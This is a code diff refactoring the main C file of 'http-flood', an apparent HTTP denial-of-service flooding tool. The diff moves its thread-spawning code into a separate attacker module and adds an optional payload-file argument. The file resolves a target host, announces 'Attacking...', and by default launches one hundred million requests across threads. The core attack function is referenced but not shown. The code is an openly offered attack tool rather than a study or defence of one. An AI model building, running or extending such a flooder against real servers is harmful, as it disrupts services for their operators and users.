@@ -1,31 +1,12 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
-#include <string.h>
 #include <arpa/inet.h>
 #include <netdb.h>
-#include <pthread.h>
 #include <sys/time.h>
 
 #include "attacker/attacker.h"
-
-#define ATTACKS_PER_THREAD 100
-
-#define LIGHT_RED "\e[1;31m"
-#define LIGHT_BLUE "\e[1;34m"
-#define CYAN "\e[0;36m"
-#define LIGHT_GREEN "\e[1;32m"
-#define YELLOW "\e[0;33m"
-#define NO_COLOR "\e[0m"
-
-
-// struct that contains values to be used in thread function (run_100_attacks)
-struct thread_args {
-    char *host;
-    char *ip;
-    int16_t port;
-    char *payload;
-};
+#include "color.h"
 
 
 // Prints the banner of the tool
@@ -39,7 +20,7 @@ void print_banner(void) {
 
 // Prints the help string
 void print_help(void) {
-    printf("Usage: http-flood <host> [port] [number of attacks]\n"); 
+    printf("Usage: http-flood <host> [port] [number of attacks] [payload file]\n");
     // TODO improve help string
 }
 
@@ -74,37 +55,21 @@ char *read_file(char *filename) {
 }
 
 
-// Thread function that runs 100 attack
-void *run_100_attacks(void *args) {
-    size_t i;
-    struct thread_args *t_args;
-
-    t_args = (struct thread_args *) args;
-    for (i = 0; i < ATTACKS_PER_THREAD; i++) {
-        attack(t_args->host, t_args->ip, t_args->port, t_args->payload);
-    }
-}
-
-
 int main(int argc, char *argv[]) {
     struct timeval start, end;
     gettimeofday(&start, NULL);
 
-    char *host, *ip, *payload, *payload_filename;
-    int port, host_length;
-    size_t i, num_attacks;
+    char *payload_filename;
+    size_t num_attacks;
 
     struct hostent *host_entry;
 
     struct thread_args t_args;
-    pthread_t t_id;
-    pthread_t *all_threads_id; // array containing the threads
-    size_t num_threads;
 
     // default values
-    port = 80;
+    t_args.port = 80;
     num_attacks = 100000000;
-    payload = NULL;
+    t_args.payload = NULL;
 
     // if user doens't specifies host
     if (argc <= 1) {
@@ -112,11 +77,10 @@ int main(int argc, char *argv[]) {
         exit(1);
     }
 
-    host = argv[1];
-    host_length = strlen(host);
+    t_args.host = argv[1];
 
     if (argc > 2) {
-        port = atoi(argv[2]);
+        t_args.port = atoi(argv[2]);
     }
     if (argc > 3) {
         num_attacks = atoll(argv[3]);
@@ -127,55 +91,33 @@ int main(int argc, char *argv[]) {
     }
     if (argc > 4) {
         payload_filename = argv[4];
-        payload = read_file(payload_filename);
+        t_args.payload = read_file(payload_filename);
     }
 
     // set the amount of threads after setting the amount of attacks
-    num_threads = num_attacks / ATTACKS_PER_THREAD;
-    all_threads_id = (pthread_t *) malloc(sizeof(pthread_t) * num_threads);
+    t_args.requests_per_thread = num_attacks / NUM_THREADS;
 
     // get ip from host_entry converting array of address in to in_addr and the 
     // converting to ascii (inet_ntoa)
-    host_entry = gethostbyname(host);
+    host_entry = gethostbyname(t_args.host);
     if (host_entry == NULL) {
         printf("Invalid host!\n");
         exit(1);
     }
-    ip = inet_ntoa(*((struct in_addr*) host_entry->h_addr_list[0]));
+    t_args.ip = inet_ntoa(*((struct in_addr*) host_entry->h_addr_list[0]));
 
     print_banner();
     printf( "host: %s%s%s\n"
             "ip: %s%s%s\n"
             "port: %s%d%s\n"
             "Number of attacks: %s%ld%s\n",
-            LIGHT_GREEN, host, NO_COLOR, LIGHT_GREEN, ip, NO_COLOR, 
-            YELLOW, port, NO_COLOR, LIGHT_RED, num_attacks, NO_COLOR);
+            LIGHT_GREEN, t_args.host, NO_COLOR, LIGHT_GREEN, t_args.ip, NO_COLOR,
+            YELLOW, t_args.port, NO_COLOR, LIGHT_RED, num_attacks, NO_COLOR);
 
     printf("Attacking...\n");
     usleep(1500 * 1000); // wait 1500 milliseconds to run
 
-    // set up thread_args
-    t_args.host = host;
-    t_args.ip = ip;
-    t_args.port = port;
-    t_args.payload = payload;
-
-    // run the threads
-    for (i = 0; i < num_threads; i++) {
-        printf("running thread: %ld\n", i+1);
-
-        pthread_create(&t_id, NULL, run_100_attacks, (void *) &t_args);
-        all_threads_id[i] = t_id; // append the thread id
-        usleep(10 * 1000); // wait 10 milliseconds to run the next thread
-    }
-
-    // wait for threads to finish
-    for (i = 0; i < num_threads; i++) {
-        t_id = all_threads_id[i];
-        pthread_join(t_id, NULL);
-    }
-
-    free((void *) all_threads_id);
+    run_threads(t_args);
 
     gettimeofday(&end, NULL);
     printf("Attack has finished in %ld seconds\n", (end.tv_sec - start.tv_sec));
